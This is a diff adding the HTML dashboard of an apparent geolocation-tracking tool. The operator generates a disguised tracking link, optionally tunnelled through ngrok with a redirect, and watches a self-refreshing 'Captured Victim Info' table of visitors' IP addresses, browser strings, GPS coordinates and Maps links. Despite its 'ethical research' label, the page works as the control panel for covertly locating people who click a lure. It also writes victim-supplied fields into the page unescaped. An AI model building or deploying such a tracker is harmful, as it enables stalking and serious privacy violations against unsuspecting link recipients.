@@ -1,0 +1,226 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8" />
+    <title>Geo-Location Tool</title>
+    <style>
+        /* your existing styles here (unchanged) */
+        body {
+            font-family: 'Segoe UI', sans-serif;
+            background-color: #f4f4f4;
+            margin: 0;
+            padding: 0;
+        }
+        header {
+            background-color: #007bff;
+            color: white;
+            padding: 20px 40px;
+            text-align: center;
+        }
+        header h1 {
+            margin: 0;
+            font-size: 28px;
+        }
+        header p {
+            margin-top: 5px;
+            font-size: 14px;
+            color: #cce3ff;
+        }
+        .container {
+            padding: 40px;
+            max-width: 800px;
+            margin: 0 auto;
+        }
+        h2 {
+            color: #333;
+        }
+        .form-section {
+            background-color: #fff;
+            padding: 25px;
+            border-radius: 10px;
+            box-shadow: 0 0 8px rgba(0,0,0,0.1);
+            margin-bottom: 40px;
+        }
+        label, select, input {
+            display: block;
+            margin-bottom: 15px;
+            width: 100%;
+        }
+        input[type="text"], select {
+            padding: 10px;
+            border: 1px solid #ccc;
+            border-radius: 6px;
+        }
+        input[type="submit"] {
+            background-color: #007bff;
+            color: #fff;
+            border: none;
+            padding: 12px 20px;
+            border-radius: 6px;
+            cursor: pointer;
+        }
+        input[type="submit"]:hover {
+            background-color: #0056b3;
+        }
+        table {
+            border-collapse: collapse;
+            width: 100%;
+            margin-top: 30px;
+        }
+        table th, table td {
+            border: 1px solid #aaa;
+            padding: 10px;
+            text-align: left;
+        }
+        table th {
+            background-color: #007bff;
+            color: white;
+        }
+        .short-link-box {
+            background-color: #e1f5fe;
+            border-left: 5px solid #0288d1;
+            padding: 15px;
+            margin-top: 20px;
+            word-wrap: break-word;
+        }
+        footer {
+            text-align: center;
+            padding: 20px;
+            font-size: 14px;
+            color: #777;
+            background-color: #f0f0f0;
+            margin-top: 40px;
+        }
+        footer a {
+            color: #007bff;
+            text-decoration: none;
+        }
+        #refresh-btn {
+            background-color: #28a745;
+            color: white;
+            border: none;
+            padding: 10px 18px;
+            border-radius: 6px;
+            cursor: pointer;
+            margin-bottom: 20px;
+        }
+        #refresh-btn:hover {
+            background-color: #218838;
+        }
+    </style>
+
+    <script>
+        function toggleTokenField() {
+            const option = document.getElementById('option').value;
+            const tokenField = document.getElementById('token-field');
+            tokenField.style.display = option === 'ngrok' ? 'block' : 'none';
+        }
+
+        // Function to refresh victim table data via AJAX (fetch JSON from /refresh_victims)
+        async function refreshTable() {
+            try {
+                const response = await fetch('/refresh_victims');
+                const data = await response.json();
+
+                const victimsSection = document.getElementById('victims-section');
+                if (!victimsSection) return;
+
+                if (data.victims.length === 0) {
+                    victimsSection.innerHTML = '<p>No victim data yet.</p>';
+                    return;
+                }
+
+                // Build the table HTML string
+                let tableHTML = `
+                    <table>
+                        <tr>
+                            <th>IP Address</th>
+                            <th>Browser Info</th>
+                            <th>Latitude</th>
+                            <th>Longitude</th>
+                            <th>Accuracy</th>
+                            <th>Google Maps</th>
+                        </tr>`;
+
+                data.victims.forEach(v => {
+                    tableHTML += `
+                        <tr>
+                            <td>${v.ip}</td>
+                            <td>${v.user_agent}</td>
+                            <td>${v.latitude}</td>
+                            <td>${v.longitude}</td>
+                            <td>${v.accuracy}</td>
+                            <td>${v.maps_link !== "N/A" ? `<a href="${v.maps_link}" target="_blank">View</a>` : 'N/A'}</td>
+                        </tr>`;
+                });
+
+                tableHTML += '</table>';
+
+                victimsSection.innerHTML = tableHTML;
+            } catch (err) {
+                console.error('Error refreshing table:', err);
+            }
+        }
+
+        // Auto refresh every 10 seconds
+        setInterval(refreshTable, 10000);
+
+        // Initial call to populate table on page load
+        window.onload = () => {
+            refreshTable();
+        };
+    </script>
+</head>
+<body>
+    <header>
+        <h1>Geo-Location Tool</h1>
+        <p>Capture visitor geolocation and browser info — built for ethical research and educational purposes.</p>
+    </header>
+
+    <div class="container">
+        <div class="form-section">
+            <h2>Generate Tracking Link</h2>
+            <form method="POST">
+                <label for="option">Choose Option:</label>
+                <select name="option" id="option" onchange="toggleTokenField()" required>
+                    <option value="">-- Select --</option>
+                    <option value="ngrok">Ngrok</option>
+                    <option value="localhost">Localhost</option>
+                </select>
+
+                <div id="token-field" style="display:none;">
+                    <label for="token">Enter Ngrok Auth Token:</label>
+                    <input type="text" name="token" placeholder="Ngrok Auth Token" />
+                </div>
+
+                <label for="redirect_url">Redirect URL after capture:</label>
+                <input type="text" name="redirect_url" placeholder="https://example.com" required />
+
+                <input type="submit" value="Generate Link" />
+            </form>
+
+            {% if short_link %}
+                <div class="short-link-box">
+                    <strong>Generated Link:</strong><br />
+                    <a href="{{ short_link }}" target="_blank">{{ short_link }}</a>
+                </div>
+            {% endif %}
+        </div>
+
+        {% if victims %}
+            <h2>Captured Victim Info</h2>
+            <!-- Refresh button -->
+            <button id="refresh-btn" onclick="refreshTable()">Refresh Table</button>
+
+            <!-- Container to replace only this part on refresh -->
+            <div id="victims-section">
+                <!-- Table will be dynamically inserted here -->
+            </div>
+        {% endif %}
+    </div>
+
+    <footer>
+        Developed with ❤️ by <strong>Sameer Hassan</strong> | <a href="https://github.com/sameerhassancode/Geo-Location" target="_blank">GitHub</a> | © 2025
+    </footer>
+</body>
+</html>
